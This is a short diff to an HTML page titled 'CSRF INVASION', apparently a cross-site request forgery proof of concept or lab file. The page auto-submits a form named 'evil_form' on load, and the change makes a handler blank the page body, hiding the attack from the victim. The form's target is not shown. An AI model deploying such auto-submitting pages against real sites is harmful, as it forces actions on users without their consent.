@@ -3,7 +3,10 @@
   <head>
     <title> CSRF INVASION </title>
     <script>
-      function prev(e){e.preventDefault()}
+      function prev(e){
+        e.preventDefault();
+        document.body.innerHTML = '';
+      }
     </script>
   </head>
   <body onload="document.evil_form.submit();">
